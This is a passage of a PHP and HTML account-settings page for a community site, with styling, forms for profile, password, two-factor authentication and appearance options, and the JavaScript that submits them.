            height: 100%;
            border-radius: 12px;
            object-fit: cover;
            border: 3px solid rgba(52, 176, 223, 0.6);
            transition: all 0.3s ease;
        }
        
        .profile-image-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.6);
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            opacity: 0;
            transition: all 0.3s ease;
            cursor: pointer;
        }
        
        .profile-image-wrapper:hover .profile-image {
            filter: blur(1px);
        }
        
        .profile-image-wrapper:hover .profile-image-overlay {
            opacity: 1;
        }
        
        .form-control {
            background-color: rgba(25, 25, 25, 0.8);
            border: 1px solid rgba(70, 70, 70, 0.4);
            color: #e0e0e0;
            border-radius: 6px;
            padding: 10px 15px;
        }
        
        .form-control:focus {
            background-color: rgba(30, 30, 30, 0.9);
            border-color: #34B0DF;
            box-shadow: 0 0 0 3px rgba(52, 176, 223, 0.25);
            color: #fff;
        }
        
        .form-label {
            color: #cccccc;
            font-weight: 500;
            margin-bottom: 8px;
        }
        
        .btn {
            border-radius: 6px;
            padding: 8px 20px;
            font-weight: 500;
            transition: all 0.3s;
        }
        
        .btn-primary {
            background-color: #34B0DF;
            border-color: #34B0DF;
        }
        
        .btn-primary:hover {
            background-color: #2993ba;
            border-color: #2993ba;
            transform: translateY(-2px);
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
        }
        
        .btn-danger {
            background-color: #dc3545;
            border-color: #dc3545;
        }
        
        .btn-danger:hover {
            background-color: #bb2d3b;
            border-color: #bb2d3b;
            transform: translateY(-2px);
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
        }
        
        .btn-outline-secondary {
            border-color: #6c757d;
            color: #b1b1b1;
        }
        
        .btn-outline-secondary:hover {
            background-color: #6c757d;
            color: #fff;
        }
        
        .divider {
            height: 1px;
            background: rgba(100, 100, 100, 0.2);
            margin: 20px 0;
        }
        
        .color-grid {
            display: grid;
            grid-template-columns: repeat(10, 1fr);
            gap: 8px;
            margin-bottom: 15px;
        }
        
        .color-box {
            height: 30px;
            border-radius: 4px;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .color-box:hover {
            transform: scale(1.1);
            box-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
        }
        
        .color-box.selected {
            border: 2px solid white;
            box-shadow: 0 0 10px white;
        }
        
        .status-badge {
            padding: 5px 10px;
            border-radius: 20px;
            font-size: 0.8rem;
            font-weight: 600;
            margin-bottom: 15px;
            display: inline-block;
        }
        
        .status-badge.enabled {
            background-color: rgba(40, 167, 69, 0.2);
            color: #2ecc71;
            border: 1px solid rgba(46, 204, 113, 0.3);
        }
        
        .status-badge.disabled {
            background-color: rgba(220, 53, 69, 0.2);
            color: #e74c3c;
            border: 1px solid rgba(231, 76, 60, 0.3);
        }
        
        .section-title {
            font-size: 1.1rem;
            font-weight: 600;
            color: #fff;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
        }
        
        .section-title i {
            margin-right: 10px;
            color: #34B0DF;
        }
        
        .text-hint {
            font-size: 0.85rem;
            color: #888;
            margin-top: 5px;
        }
        
        .password-strength-container {
            margin-top: 5px;
        }

        .password-strength-bars {
            display: flex;
            gap: 5px;
            margin-top: 5px;
        }

        .password-strength-bar {
            flex: 1;
            height: 8px;
            border-radius: 4px;
            background-color: #444;
            transition: background-color 0.3s ease;
        }

        .password-strength-bar.active.weak {
            background-color: red;
        }

        .password-strength-bar.active.moderate {
            background-color: orange;
        }

        .password-strength-bar.active.strong {
            background-color: green;
        }

        .password-strength-text {
            margin-top: 5px;
            font-size: 0.9rem;
            font-weight: bold;
            color: #888;
        }

        .recent-pfps-section {
            margin: 20px 0 10px 0;
            text-align: center;
        }
        .recent-pfps-list {
            display: flex;
            justify-content: center;
            gap: 12px;
        }
        .recent-pfp-thumb {
            position: relative;
            width: 48px;
            height: 48px;
            border-radius: 8px;
            overflow: hidden;
            border: 2px solid #444;
            cursor: pointer;
            transition: border-color 0.2s, box-shadow 0.2s;
            background: #222;
        }
        .recent-pfp-thumb:hover {
            border-color: #34B0DF;
            box-shadow: 0 0 8px #34B0DF55;
        }
        .recent-pfp-thumb img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: block;
        }
        .recent-pfp-delete {
            display: none;
            position: absolute;
            top: 2px;
            right: 2px;
            background: rgba(0,0,0,0.7);
            color: #fff;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            align-items: center;
            justify-content: center;
            font-size: 14px;
            z-index: 2;
            cursor: pointer;
        }
        .recent-pfp-thumb:hover .recent-pfp-delete {
            display: flex;
        }

        .animated-alert {
            animation: fadeInScale 0.7s cubic-bezier(0.23, 1, 0.32, 1);
        }
        @keyframes fadeInScale {
            0% {
                opacity: 0;
                transform: scale(0.95);
            }
            100% {
                opacity: 1;
                transform: scale(1);
            }
        }
    </style>
</head>

<body>

<?php include('navbar.php'); ?>

<div class="container py-4">
    <div class="row mb-3">
        <div class="col-lg-6 mx-auto">
            <input type="text" id="settings-search" class="form-control" placeholder="Search settings...">
        </div>
    </div>
    <div class="row">
        <div class="col-lg-3 mb-4">
            <div class="profile-container">
                <div class="profile-image-wrapper">
                    <img src="<?= htmlspecialchars($profilePicture) ?>" class="profile-image" alt="Profile picture">
                    <div class="profile-image-overlay" id="change-profile-pic">
                        <i class="fas fa-camera fa-lg text-white"></i>
                    </div>
                    <form id="profile-image-form" method="POST" enctype="multipart/form-data" style="display: none;">
                        <input type="file" id="profile-image-input" name="profile-image" accept="image/png, image/jpeg">
                        <input type="hidden" name="csrf_token" value="<?= htmlspecialchars($_SESSION['csrf_token']) ?>">
                    </form>
                </div>
                <?php if (!empty($recentPfps)): ?>
                <div class="recent-pfps-section">
                    <div style="color:#bbb;font-size:0.95em;margin-bottom:5px;">Recent Profile Pictures</div>
                    <div class="recent-pfps-list">
                        <?php foreach ($recentPfps as $pfp): ?>
                        <div class="recent-pfp-thumb" data-pfp-id="<?= $pfp['id'] ?>" title="Click to equip">
                            <img src="<?= htmlspecialchars($pfp['file_path']) ?>" alt="Recent PFP">
                            <div class="recent-pfp-delete" title="Delete">
                                <i class="fas fa-times"></i>
                            </div>
                        </div>
                        <?php endforeach; ?>
                    </div>
                </div>
                <?php else: ?>
                <div class="recent-pfps-section">
                    <div class="alert alert-secondary" style="margin:10px 0 0 0;padding:8px 10px;">
                        <i class="fas fa-info-circle me-1"></i> You do not have any recent profile pictures.
                    </div>
                </div>
                <?php endif; ?>
                <h5 class="text-white mb-2"><?= htmlspecialchars($username) ?></h5>
                <span class="badge bg-dark"><?= htmlspecialchars($user_rank) ?></span>
            </div>
            
            <div class="settings-nav">
                <div class="nav flex-column" id="settings-tabs" role="tablist">
                    <a class="nav-link active" id="account-tab" data-bs-toggle="pill" href="#account" role="tab">
                        <i class="fas fa-user-circle"></i> Account
                    </a>
                    <a class="nav-link" id="security-tab" data-bs-toggle="pill" href="#security" role="tab">
                        <i class="fas fa-shield-alt"></i> Security
                    </a>
                    <a class="nav-link" id="appearance-tab" data-bs-toggle="pill" href="#appearance" role="tab">
                        <i class="fas fa-palette"></i> Appearance
                    </a>
                </div>
            </div>
        </div>
        
        <div class="col-lg-9">
            <div class="tab-content">
                <div class="tab-pane fade show active" id="account" role="tabpanel">
                    <?php if (isset($successMessage)): ?>
                        <div class="alert alert-success animated-alert"><?= $successMessage ?></div>
                    <?php elseif (isset($errorMessage)): ?>
                        <div class="alert alert-danger animated-alert"><?= $errorMessage ?></div>
                    <?php endif; ?>
                    <div class="settings-card fade-in">
                        <div class="settings-header">
                            <h5 class="m-0 text-white">
                                <i class="fas fa-user-edit text-primary me-2"></i> Account Information
                            </h5>
                        </div>
                        <div class="settings-body">
                            <form method="POST">
                                <input type="hidden" name="csrf_token" value="<?= htmlspecialchars($_SESSION['csrf_token']) ?>">
                                <div class="mb-3">
                                    <label for="new_username" class="form-label">
                                        Username
                                        <i class="fas fa-question-circle ms-1 text-info" data-bs-toggle="tooltip" title="Change your username. Limited by your rank."></i>
                                    </label>
                                    <input type="text" class="form-control" id="new_username" name="new_username" value="<?php echo htmlspecialchars($username); ?>">
                                    <div class="text-hint">
                                        <i class="fas fa-info-circle"></i> You have <?php echo ($change_limit - $_SESSION['name_changes']); ?> username changes left.
                                    </div>
                                </div>
                                <div class="mb-3">
                                    <label for="user_email" class="form-label">
                                        Email
                                        <i class="fas fa-question-circle ms-1 text-info" data-bs-toggle="tooltip" title="Your registered email address."></i>
                                    </label>
                                    <div class="input-group">
                                        <input type="email" class="form-control" id="user_email" value="<?= htmlspecialchars($user_email) ?>" readonly>
                                        <?php if (!empty($user_email)): ?>
                                            <button type="button" class="btn btn-outline-danger" id="remove-email-btn"><i class="fas fa-trash"></i></button>
                                        <?php else: ?>
                                            <button type="button" class="btn btn-outline-primary" id="add-email-btn"><i class="fas fa-plus"></i></button>
                                        <?php endif; ?>
                                    </div>
                                </div>
                                <?php if ($twofa_enabled): ?>
                                <div class="mb-3">
                                    <label for="2fa_code" class="form-label">
                                        2FA Code
                                        <i class="fas fa-question-circle ms-1 text-info" data-bs-toggle="tooltip" title="Enter your 2FA code to confirm changes."></i>
                                    </label>
                                    <input type="text" class="form-control" id="2fa_code" name="2fa_code" required>
                                </div>
                                <?php endif; ?>
                                <button type="submit" name="change_name" class="btn btn-primary">
                                    <i class="fas fa-save me-1"></i> Update Username
                                </button>
                            </form>
                        </div>
                    </div>
                    
                    <div class="settings-card fade-in" style="animation-delay: 0.1s;">
                        <div class="settings-header">
                            <h5 class="m-0 text-white">
                                <i class="fas fa-info-circle text-primary me-2"></i> Biography
                            </h5>
                        </div>
                        <div class="settings-body">
                            <form method="POST">
                                <input type="hidden" name="csrf_token" value="<?= htmlspecialchars($_SESSION['csrf_token']) ?>">
                                <div class="mb-3">
                                    <label for="bio" class="form-label">
                                        About Me
                                        <i class="fas fa-question-circle ms-1 text-info" data-bs-toggle="tooltip" title="Write a short description about yourself."></i>
                                    </label>
                                    <textarea class="form-control" name="bio" id="bio" rows="3"><?php echo htmlspecialchars($user_bio); ?></textarea>
                                    <div class="text-hint">Tell others about yourself in a few sentences</div>
                                </div>
                                <button type="submit" name="update_bio" class="btn btn-primary">
                                    <i class="fas fa-save me-1"></i> Update Bio
                                </button>
                            </form>
                        </div>
                    </div>
                    
                    <div class="settings-card fade-in" style="animation-delay: 0.2s;">
                        <div class="settings-header">
                            <h5 class="m-0 text-white">
                                <i class="fas fa-image text-primary me-2"></i> Profile Banner
                            </h5>
                        </div>
                        <div class="settings-body">
                            <form method="POST" enctype="multipart/form-data">
                                <input type="hidden" name="csrf_token" value="<?= htmlspecialchars($_SESSION['csrf_token']) ?>">
                                <div class="mb-3">
                                    <label for="banner-image" class="form-label">
                                        Upload Banner Image
                                        <i class="fas fa-question-circle ms-1 text-info" data-bs-toggle="tooltip" title="Upload a banner for your profile. JPG/PNG, max 5MB."></i>
                                    </label>
                                    <input type="file" class="form-control" name="banner-image" id="banner-image" accept="image/png, image/jpeg">
                                    <div class="text-hint">Recommended dimensions: 1200x300 pixels. Max size: 5MB</div>
                                </div>
                                <div class="d-flex gap-2">
                                    <button type="submit" class="btn btn-primary">
                                        <i class="fas fa-cloud-upload-alt me-1"></i> Upload Banner
                                    </button>
                                    <button type="submit" name="remove_banner" class="btn btn-outline-secondary">
                                        <i class="fas fa-trash me-1"></i> Remove Banner
                                    </button>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
                
                <div class="tab-pane fade" id="security" role="tabpanel">
                    <div class="settings-card fade-in">
                        <div class="settings-header">
                            <h5 class="m-0 text-white"><i class="fas fa-key text-primary me-2"></i> Change Password</h5>
                        </div>
                        <div class="settings-body">
                            <form method="POST">
                                <input type="hidden" name="csrf_token" value="<?= htmlspecialchars($_SESSION['csrf_token']) ?>">
                                <div class="mb-3">
                                    <label for="currentPassword" class="form-label">
                                        Current Password
                                        <i class="fas fa-question-circle ms-1 text-info" data-bs-toggle="tooltip" title="Enter your current password to confirm changes."></i>
                                    </label>
                                    <input type="password" class="form-control" id="currentPassword" name="currentPassword" required>
                                </div>
                                <div class="mb-3">
                                    <label for="newPassword" class="form-label">
                                        New Password
                                        <i class="fas fa-question-circle ms-1 text-info" data-bs-toggle="tooltip" title="Choose a strong password."></i>
                                    </label>
                                    <input type="password" class="form-control" id="newPassword" name="newPassword" required>
                                    <div class="password-strength-container">
                                        <div class="password-strength-bars">
                                            <div class="password-strength-bar" id="bar1"></div>
                                            <div class="password-strength-bar" id="bar2"></div>
                                            <div class="password-strength-bar" id="bar3"></div>
                                        </div>
                                        <div class="password-strength-text" id="password-strength-text">Enter a password</div>
                                    </div>
                                </div>
                                <div class="mb-3">
                                    <label for="confirmPassword" class="form-label">
                                        Confirm New Password
                                        <i class="fas fa-question-circle ms-1 text-info" data-bs-toggle="tooltip" title="Re-enter your new password."></i>
                                    </label>
                                    <input type="password" class="form-control" id="confirmPassword" name="confirmPassword" required>
                                </div>
                                
                                <?php if ($twofa_enabled): ?>
                                <div class="mb-3">
                                    <label for="2fa_code_pw" class="form-label">
                                        2FA Code
                                        <i class="fas fa-question-circle ms-1 text-info" data-bs-toggle="tooltip" title="Enter your 2FA code to confirm changes."></i>
                                    </label>
                                    <input type="text" class="form-control" id="2fa_code_pw" name="2fa_code" required>
                                </div>
                                <?php endif; ?>
                                <button type="submit" name="change_password" class="btn btn-primary">
                                    <i class="fas fa-lock me-1"></i> Change Password
                                </button>
                            </form>
                        </div>
                    </div>
                    
                    <div class="settings-card fade-in" style="animation-delay: 0.1s;">
                        <div class="settings-header">
                            <h5 class="m-0 text-white"><i class="fas fa-shield-alt text-primary me-2"></i> Two-Factor Authentication</h5>
                        </div>
                        <div class="settings-body">
                            <?php if ($twofa_enabled): ?>
                                <div class="status-badge enabled mb-3">
                                    <i class="fas fa-check-circle me-1"></i> 2FA Enabled
                                </div>
                                <p>Your account is currently protected with two-factor authentication.</p>
                                <form method="POST">
                                    <input type="hidden" name="csrf_token" value="<?= htmlspecialchars($_SESSION['csrf_token']) ?>">
                                    <div class="mb-3">
                                        <label for="disable_2fa_code" class="form-label">Enter 2FA Code to Disable</label>
                                        <input type="text" class="form-control" id="disable_2fa_code" name="2fa_code" required>
                                    </div>
                                    <button type="submit" name="disable_2fa" class="btn btn-danger">
                                        <i class="fas fa-times-circle me-1"></i> Disable 2FA
                                    </button>
                                </form>
                            <?php else: ?>
                                <div class="status-badge disabled mb-3">
                                    <i class="fas fa-times-circle me-1"></i> 2FA Disabled
                                </div>
                                <p>Add an extra layer of security to your account by enabling two-factor authentication.</p>
                                <button type="button" id="setup-2fa-btn" class="btn btn-primary">
                                    <i class="fas fa-shield-alt me-1"></i> Setup 2FA
                                </button>
                            <?php endif; ?>
                        </div>
                    </div>
                </div>
                
                <div class="tab-pane fade" id="appearance" role="tabpanel">
                    <div class="settings-card fade-in">
                        <div class="settings-header">
                            <h5 class="m-0 text-white"><i class="fas fa-palette text-primary me-2"></i> Color Preferences</h5>
                        </div>
                        <div class="settings-body">
                            <?php if (isset($_SESSION['has_color']) && $_SESSION['has_color'] == 1): ?>
                                <div class="mb-4">
                                    <div class="section-title">
                                        <i class="fas fa-swatchbook"></i> Choose Your Color
                                        <i class="fas fa-question-circle ms-1 text-info" data-bs-toggle="tooltip" title="Pick a color for your username and highlights."></i>
                                    </div>
                                    
                                    <div class="color-grid">
                                        <?php
                                        $colors = [
                                            "#BB71E4", "#4B2E83", "#FEC8D8", "#BB1E64", "#FFFFFF",
                                            "#365DDA", "#F96D31", "#FFFE71", "#B83C26", "#C5C6D3",
                                            "#94FAAC", "#964B00", "#000080", "#FF69B4", "#FFD580",
                                            "#601EF9", "#30D5C8", "#9999FF", "#4C4CFF", "#004C00"
                                        ];

                                        foreach ($colors as $color) {
                                            echo '<div style="background-color: ' . $color . ';" class="color-box" data-color="' . $color . '"></div>';
                                        }
                                        ?>
                                    </div>
                                    
                                    <div class="divider"></div>
                                    
                                    <div class="section-title">
                                        <i class="fas fa-sliders-h"></i> Custom Color
                                        <i class="fas fa-question-circle ms-1 text-info" data-bs-toggle="tooltip" title="Use the color picker for a custom color."></i>
                                    </div>
                                    <div class="row align-items-center">
                                        <div class="col-md-8 mb-3">
                                            <input type="color" id="customColorPicker" value="#ffffff" class="form-control">
                                        </div>
                                        <div class="col-md-4 mb-3">
                                            <button id="confirmButton" class="btn btn-primary w-100">
                                                <i class="fas fa-check me-1"></i> Apply Color
                                            </button>
                                        </div>
                                    </div>
                                </div>
                            <?php else: ?>
                                <div class="alert alert-secondary">
                                    <i class="fas fa-info-circle me-2"></i> Color customization is only available for premium users.
                                </div>
                            <?php endif; ?>
                        </div>
                    </div>

                    <div class="settings-card fade-in" style="animation-delay: 0.025s;">
                        <div class="settings-header">
                            <h5 class="m-0 text-white"><i class="fas fa-image text-primary me-2"></i> Profile Background</h5>
                        </div>
                        <div class="settings-body">
                            <?php
                            $bg_allowed_ranks = ['Admin', 'Manager', 'Mod', 'Council', 'Clique', 'Rich', 'Kte', 'Founder'];
                            if (in_array($user_rank, $bg_allowed_ranks)):
                            ?>
                                <form method="POST" enctype="multipart/form-data">
                                    <input type="hidden" name="csrf_token" value="<?= htmlspecialchars($_SESSION['csrf_token']) ?>">
                                    <div class="mb-3">
                                        <label for="profile_bg" class="form-label">Upload PNG, JPG, or GIF (max 8MB)</label>
                                        <input type="file" class="form-control" name="profile_bg" id="profile_bg" accept=".png,.jpg,.jpeg,.gif,image/png,image/jpeg,image/gif">
                                        <div class="text-hint">PNG, JPG, or GIF files allowed. Max size: 8MB. GIFs will be animated.</div>
                                    </div>
                                    <div class="d-flex gap-2">
                                        <button type="submit" class="btn btn-primary">
                                            <i class="fas fa-upload me-1"></i> Upload Background
                                        </button>
                                        <?php if (!empty($profile_bg) && file_exists($profile_bg)): ?>
                                        <button type="submit" name="remove_bg" class="btn btn-outline-secondary">
                                            <i class="fas fa-trash me-1"></i> Remove Background
                                        </button>
                                        <?php endif; ?>
                                    </div>
                                </form>

                            <?php else: ?>
                                <div class="alert alert-secondary">
                                    <i class="fas fa-info-circle me-2"></i> Profile background upload is only available for select user ranks.
                                </div>
                            <?php endif; ?>
                        </div>
                    </div>

                    <div class="settings-card fade-in" style="animation-delay: 0.1s;">
                        <div class="settings-header">
                            <h5 class="m-0 text-white"><i class="fas fa-music text-primary me-2"></i> Profile Music</h5>
                        </div>
                        <div class="settings-body">
                            <?php
                            $music_allowed_ranks = ['Admin', 'Manager', 'Mod', 'Council', 'Founder', 'Clique', 'Rich', 'Kte'];
                            if (in_array($user_rank, $music_allowed_ranks)):
                            ?>
                                <form method="POST" enctype="multipart/form-data">
                                    <input type="hidden" name="csrf_token" value="<?= htmlspecialchars($_SESSION['csrf_token']) ?>">
                                    <div class="mb-3">
                                        <label for="profile_music" class="form-label">
                                            Upload MP3 (max 5MB)
                                            <i class="fas fa-question-circle ms-1 text-info" data-bs-toggle="tooltip" title="Upload a music file for your profile. MP3 only, max 5MB."></i>
                                        </label>
                                        <input type="file" class="form-control" name="profile_music" id="profile_music" accept=".mp3,audio/mp3,audio/mpeg">
                                        <div class="text-hint">Only MP3 files allowed. Max size: 5MB.</div>
                                    </div>
                                    <div class="d-flex gap-2">
                                        <button type="submit" class="btn btn-primary">
                                            <i class="fas fa-upload me-1"></i> Upload Music
                                        </button>
                                        <?php
                                        $stmt = $conn->prepare("SELECT profile_music FROM users WHERE username = ?");
                                        $stmt->bind_param("s", $username);
                                        $stmt->execute();
                                        $stmt->bind_result($profile_music);
                                        $stmt->fetch();
                                        $stmt->close();
                                        if (!empty($profile_music) && file_exists($profile_music)):
                                        ?>
                                        <form method="POST" style="display:inline;">
                                            <input type="hidden" name="csrf_token" value="<?= htmlspecialchars($_SESSION['csrf_token']) ?>">
                                            <button type="submit" name="remove_music" class="btn btn-outline-secondary">
                                                <i class="fas fa-trash me-1"></i> Remove Music
                                            </button>
                                        </form>
                                        <?php endif; ?>
                                    </div>
                                </form>
                                <?php

if (!empty($profile_music) && file_exists($profile_music)):
                                ?>
                                    <div class="mt-3">
                                        <label class="form-label">Current Music:</label>
                                        <audio controls style="width:100%;">
                                            <source src="/<?= htmlspecialchars($profile_music) ?>" type="audio/mpeg">
                                            Your browser does not support the audio element.
                                        </audio>
                                    </div>
                                <?php endif; ?>
                            <?php else: ?>
                                <div class="alert alert-secondary">
                                    <i class="fas fa-info-circle me-2"></i> Music upload is only available for select user ranks.
                                </div>
                            <?php endif; ?>
                        </div>
                    </div>

                    <div class="settings-card fade-in" style="animation-delay: 0.1s;">
                        <div class="settings-header">
                            <h5 class="m-0 text-white"><i class="fas fa-award text-primary me-2"></i> Display Badge</h5>
                        </div>
                        <div class="settings-body">
                            <?php if (empty($all_badges)): ?>
                                <div class="alert alert-secondary">
                                    <i class="fas fa-info-circle me-2"></i> You currently don't have any badges.
                                </div>
                            <?php else: ?>
                                <form method="POST">
                                    <input type="hidden" name="csrf_token" value="<?= htmlspecialchars($_SESSION['csrf_token']) ?>">
                                    <div class="mb-3">
                                        <label class="form-label">
                                            Select Badges to Display (no limit)
                                            <i class="fas fa-question-circle ms-1 text-info" data-bs-toggle="tooltip" title="Choose which badges to show on your profile."></i>
                                        </label>
                                        <div class="list-group">
                                            <?php foreach ($all_badges as $badge): ?>
                                                <div class="list-group-item d-flex align-items-center">
                                                    <input class="form-check-input me-3" type="checkbox" name="display_badge[]" value="<?= $badge['id'] ?>"
                                                        <?= in_array($badge['id'], $selected_badges) ? 'checked' : '' ?>>
                                                    <img src="<?= htmlspecialchars($badge['image_url']) ?>" alt="<?= htmlspecialchars($badge['name']) ?>" style="width: 30px; height: 30px; margin-right: 10px;">
                                                    <span><?= htmlspecialchars($badge['name']) ?></span>
                                                </div>
                                            <?php endforeach; ?>
                                        </div>
                                        <div class="text-hint">You can select any number of badges to display.</div>
                                    </div>
                                    <button type="submit" name="update_display_badge" class="btn btn-primary">
                                        <i class="fas fa-save me-1"></i> Save Changes
                                    </button>
                                </form>
                            <?php endif; ?>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="modal fade" id="addEmailModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content bg-dark">
                <div class="modal-header border-secondary">
                    <h5 class="modal-title text-white"><i class="fas fa-envelope text-primary me-2"></i> Add Email</h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <form id="add-email-form">
                        <input type="hidden" name="csrf_token" value="<?= htmlspecialchars($_SESSION['csrf_token']) ?>">
                        <div class="mb-3">
                            <label for="new_email" class="form-label text-white">Email Address</label>
                            <input type="email" class="form-control" id="new_email" name="new_email" required placeholder="Enter your email">
                        </div>
                        <button type="submit" class="btn btn-primary w-100">
                            <i class="fas fa-paper-plane me-1"></i> Send Verification Code
                        </button>
                    </form>
                    <div id="add-email-msg" class="mt-2"></div>
                </div>
            </div>
        </div>
    </div>
       <div class="modal fade" id="verifyEmailModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content bg-dark">
                <div class="modal-header border-secondary">
                    <h5 class="modal-title text-white"><i class="fas fa-key text-primary me-2"></i> Verify Email</h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <form id="verify-email-form">
                        <input type="hidden" name="csrf_token" value="<?= htmlspecialchars($_SESSION['csrf_token']) ?>">
                        <div class="mb-3">
                            <label for="email_code" class="form-label text-white">Verification Code</label>
                            <input type="text" class="form-control" id="email_code" name="email_code" required placeholder="Enter the 6-digit code">
                        </div>
                        <button type="submit" class="btn btn-primary w-100">
                            <i class="fas fa-check-circle me-1"></i> Verify and Add Email
                        </button>
                    </form>
                    <div id="verify-email-msg" class="mt-2"></div>
                </div>
            </div>
        </div>
    </div>
    <div class="modal fade" id="removeEmailModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content bg-dark">
                <div class="modal-header border-secondary">
                    <h5 class="modal-title text-white"><i class="fas fa-key text-danger me-2"></i> Remove Email</h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <form id="remove-email-form">
                        <input type="hidden" name="csrf_token" value="<?= htmlspecialchars($_SESSION['csrf_token']) ?>">
                        <div class="mb-3">
                            <label for="remove_email_code" class="form-label text-white">Verification Code</label>
                            <input type="text" class="form-control" id="remove_email_code" name="remove_email_code" required placeholder="Enter the 6-digit code">
                        </div>
                        <button type="submit" class="btn btn-danger w-100">
                            <i class="fas fa-check-circle me-1"></i> Confirm Remove Email
                        </button>
                    </form>
                    <div id="remove-email-msg" class="mt-2"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="modal fade" id="2faModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content bg-dark">
                <div class="modal-header border-secondary">
                    <h5 class="modal-title text-white"><i class="fas fa-shield-alt text-primary me-2"></i> Setup Two-Factor Authentication</h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <div id="qrCode" class="mb-3 text-center"></div>
                    <div class="mb-3">
                        <label for="secretKey" class="form-label text-white">Secret Key</label>
                        <div class="input-group">
                            <input type="text" class="form-control" id="secretKey" readonly>
                            <button class="btn btn-outline-secondary" type="button" id="copy-secret"><i class="fas fa-copy"></i></button>
                        </div>
                    </div>
                    <form id="verify-2fa-form">
                        <input type="hidden" name="csrf_token" value="<?= htmlspecialchars($_SESSION['csrf_token']) ?>">
                        <div class="mb-3">
                            <label for="2fa-code" class="form-label text-white">Enter 6-digit code from your Authenticator app</label>
                            <input type="text" class="form-control" id="2fa-code" name="2fa_code" required placeholder="123456">
                        </div>
                        <button type="submit" class="btn btn-primary w-100">
                            <i class="fas fa-check-circle me-1"></i> Verify & Enable 2FA
                        </button>
                    </form>
                    <div id="verify-2fa-msg" class="mt-2"></div>
                </div>
            </div>
        </div>
    </div>

    <script>
    document.addEventListener('DOMContentLoaded', function() {
        const changeProfilePic = document.getElementById('change-profile-pic');
        if (changeProfilePic) {
            changeProfilePic.addEventListener('click', function() {
                document.getElementById('profile-image-input').click();
            });
        }

        const profileImageInput = document.getElementById('profile-image-input');
        if (profileImageInput) {
            profileImageInput.addEventListener('change', function() {
                document.getElementById('profile-image-form').submit();
            });
        }

        const setupBtn = document.getElementById('setup-2fa-btn');
        const qrCodeDiv = document.getElementById('qrCode');
        const secretKeyInput = document.getElementById('secretKey');
        const copyBtn = document.getElementById('copy-secret');
        const verify2faForm = document.getElementById('verify-2fa-form');
        const verify2faMsg = document.getElementById('verify-2fa-msg');
        let twofaModal = null;
        if (document.getElementById('2faModal')) {
            twofaModal = new bootstrap.Modal(document.getElementById('2faModal'));
        }

        if (setupBtn && twofaModal) {
            setupBtn.addEventListener('click', function() {
                fetch('settings.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'setup_2fa=true&csrf_token=<?= htmlspecialchars($_SESSION['csrf_token']) ?>'
                })
                .then(response => response.json())
                .then(data => {
                    qrCodeDiv.innerHTML = `<img src="${data.qrCodeUrl}" alt="QR Code" class="img-fluid">`;
                    secretKeyInput.value = data.secret;
                    verify2faMsg.textContent = '';
                    verify2faForm.reset();
                    twofaModal.show();
                })
                .catch(error => {
                    qrCodeDiv.innerHTML = '<div class="alert alert-danger">Failed to load QR code.</div>';
                });
            });
        }

        if (copyBtn && secretKeyInput) {
            copyBtn.addEventListener('click', function() {
                secretKeyInput.select();
                secretKeyInput.setSelectionRange(0, 99999);
                document.execCommand('copy');
                copyBtn.innerHTML = '<i class="fas fa-check"></i>';
                setTimeout(() => {
                    copyBtn.innerHTML = '<i class="fas fa-copy"></i>';
                }, 2000);
            });
        }

        if (verify2faForm) {
            verify2faForm.addEventListener('submit', function(event) {
                event.preventDefault();
                verify2faMsg.textContent = '';
                const code = document.getElementById('2fa-code').value;
                fetch('settings.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: `verify_2fa=true&2fa_code=${encodeURIComponent(code)}&csrf_token=<?= htmlspecialchars($_SESSION['csrf_token']) ?>`
                })
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        verify2faMsg.className = 'alert alert-success mt-2';
                        verify2faMsg.textContent = data.message || '2FA enabled!';
                        setTimeout(() => { twofaModal.hide(); window.location.reload(); }, 1200);
                    } else {
                        verify2faMsg.className = 'alert alert-danger mt-2';
                        verify2faMsg.textContent = data.message || 'Verification failed.';
                    }
                })
                .catch(() => {
                    verify2faMsg.className = 'alert alert-danger mt-2';
                    verify2faMsg.textContent = 'An error occurred. Please try again.';
                });
            });
        }

        const colorBoxes = document.querySelectorAll('.color-box');
        const customColorPicker = document.getElementById('customColorPicker');
        const confirmButton = document.getElementById('confirmButton');
        let selectedColor = customColorPicker.value;

        colorBoxes.forEach(box => {
            box.addEventListener('click', function () {
                selectedColor = this.getAttribute('data-color');
                colorBoxes.forEach(b => b.classList.remove('selected'));
                this.classList.add('selected');
                customColorPicker.value = selectedColor; 
            });
        });

        customColorPicker.addEventListener('input', function () {
            selectedColor = this.value; 
            colorBoxes.forEach(b => b.classList.remove('selected')); 
        });

        confirmButton.addEventListener('click', function () {
           
            const formData = new FormData();
            formData.append('update_color', true);
            formData.append('selected_color', selectedColor);
            formData.append('csrf_token', '<?= htmlspecialchars($_SESSION['csrf_token']) ?>');

            fetch('settings.php', {
                method: 'POST',
                body: formData
            })
